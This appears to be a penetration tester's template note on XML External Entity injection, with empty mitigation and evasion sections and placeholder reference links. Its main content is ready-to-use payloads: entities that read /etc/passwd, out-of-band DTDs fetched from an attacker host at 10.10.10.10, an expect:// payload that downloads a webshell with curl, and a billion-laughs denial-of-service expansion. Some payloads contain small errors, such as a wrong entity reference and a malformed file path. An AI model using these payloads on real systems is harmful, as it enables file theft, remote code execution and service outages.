---
category: technique
subjects:
  - cybersec
full_form: XML External Entity Injection
acronym: XXEi
cwe:
  - NULL
vector: remote/adjacent network/local/client-side
privileges: unauthenticated/authenticated/root
target: NULL
platform:
  - NULL
intent:
  - NULL
---
## Definition
Exploitation of outdated [XML]{Extensible Markup Language} libraries used for parsing user input without proper sanitization

## Discovery
test if it's possible to call entities
find error based injections by producing an error

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>%nonExistingEntity;</root>
```

## Execution
can reach [[File Inclusion#Local File Inclusion|LFI]] by subverting the [XML]{Extensible Markup Language} [DTD]{Document Type Definition}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
	<!ENTITY pwned SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<email>
	<date>00-00-0000</date>
	<time>00:00 am UTC</time>
	<sender>usr@domain.com</sender>
	<recipients>
		<to>usr@domain.com</to>
	</recipients>
	<body>&pwned;</body>
</email>
```

or by using CDATA

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
	<!ENTITY % s "<![CDATA[">
	<!ENTITY % f SYSTEM "file://etc/passwd">
	<!ENTITY % e "]]>">
	<!ENTITY % pwned SYSTEM "http://10.10.10.10/xxe.dtd"> <!-- <!ENTITY payload "%s;%f;%e;"> -->
	%pwned;
]>
<email>
	<date>00-00-0000</date>
	<time>00:00 am UTC</time>
	<sender>usr@domain.com</sender>
	<recipients>
		<to>usr@domain.com</to>
	</recipients>
	<body>&pwned;</body>
</email>
```

or in an error based, by producing the payload:

```txt
<!ENTITY % file SYSTEM "file://etc/passwd">
<!ENTITY % error SYSTEM "%nonExistingEntity;/%file;">
```

and including in the vulnerable endpoit

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
	<!ENTITY % pwned SYSTEM "http://10.10.10.10/xxe.dtd">
	%pwned
	%error
]>
<root></root>
```

[RCE]{Remote Code Evaluation} when `expect` is installed and enabled

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
	<!ENTITY pwned SYSTEM "expect://curl$IFS-o$IFS10.10.10.10/webshell.php">
]>
<email>
	<date>00-00-0000</date>
	<time>00:00 am UTC</time>
	<sender>usr@domain.com</sender>
	<recipients>
		<to>usr@domain.com</to>
	</recipients>
	<body>&pwned;</body>
</email>
```

[SSRF]{Server‑Side Request Forgery}

[DoS]{Denial of Service}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<email>
	<date>00-00-0000</date>
	<time>00:00 am UTC</time>
	<sender>usr@domain.com</sender>
	<recipients>
		<to>usr@domain.com</to>
	</recipients>
	<body>&pwned;</body>
</email>
```

## Mitigation

## Evasion

## Relevant Reading
- [TNNNN - NAME](https://attack.mitre.org/techniques/TNNNN)
- [TANNNN - NAME](https://attack.mitre.org/tactics/TANNNN)
- [MNNNN - NAME](https://attack.mitre.org/mitigations/MNNNN)
- [Payload All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/)
- [EDB-ID XXXXXX](https://www.exploit-db.com/)
